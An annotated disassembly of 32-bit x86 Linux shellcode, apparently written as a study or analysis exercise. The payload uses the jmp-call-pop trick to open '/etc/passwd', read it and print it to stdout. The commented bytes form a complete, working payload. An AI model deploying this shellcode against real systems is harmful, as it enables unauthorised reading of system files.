00000000  EB36              jmp short 0x38          ; 1. Jump to another location ( Line 19 )
00000002  B805000000        mov eax,0x5             ; save sys call = 0x5 = int open(const char *pathname, int flags);
00000007  5B                pop ebx                 ; 3. pop the address of file ( /etc/passwd )
00000008  31C9              xor ecx,ecx             ; make ecx = 0
                                                    ; So:
                                                    ; eax = sys call = 0x5 open 
                                                    ; ebx = *pathname = /etc/passwd
                                                    ; ecx = flags = NULL
0000000A  CD80              int 0x80                ; intrrupt
0000000C  89C3              mov ebx,eax             ; return the new file descriptor or -1 if an error occurred


0000000E  B803000000        mov eax,0x3             ;  save sys call = 0x3 = ssize_t read(int fd, void *buf, size_t count);       
00000013  89E7              mov edi,esp             
00000015  89F9              mov ecx,edi             ; pointer to the buffer 
00000017  BA00100000        mov edx,0x1000          ; read 4,096 bytes 
                                                    ; So:
                                                    ; eax = sys call = 0x3 read
                                                    ; ebx = fd = file descriptor <-- returned from open sys call
                                                    ; ecx = *buf = pointer to buffer to write to from fd
                                                    ; edx = count = read up to 4,096 bytes from file descriptor 
0000001C  CD80              int 0x80                ; intrrupt
0000001E  89C2              mov edx,eax             ; return the number of bytes read, or -1 in failure


00000020  B804000000        mov eax,0x4             ; save sys call = 0x4 = ssize_t write(int fd, const void *buf, size_t count);
00000025  BB01000000        mov ebx,0x1             ; fd = 1 = stdout
                                                    ; So:
                                                    ; ebx = fd = 1 = file descriptor to write to 
                                                    ; ecx = *buf = pointer to buffer to write it to fd
                                                    ; edx = count = write up to 4,096 bytes from buffer to file descriptor 
0000002A  CD80              int 0x80                ; intrrupt
0000002C  B801000000        mov eax,0x1             ; save sys call = 0x1 =  void exit(int status);
00000031  BB00000000        mov ebx,0x0             ; ebx = status = 0 = EXIT_SUCCESSFULL
00000036  CD80              int 0x80                ; interrupt


00000038  E8C5FFFFFF        call 0x2                ; 2. push the next instruction's addr to the stack and Call function at Line 2 
0000003D  2F                das                     ; letter = /
0000003E  657463            gs jz 0xa4              ; letters = etc
00000041  2F                das                     ; letter = /
00000042  7061              jo 0xa5                 ; letters = pa
00000044  7373              jnc 0xb9                ; letters = ss
00000046  7764              ja 0xac                 ; letters = wd
00000048  00                db 0x00                 ; null terminator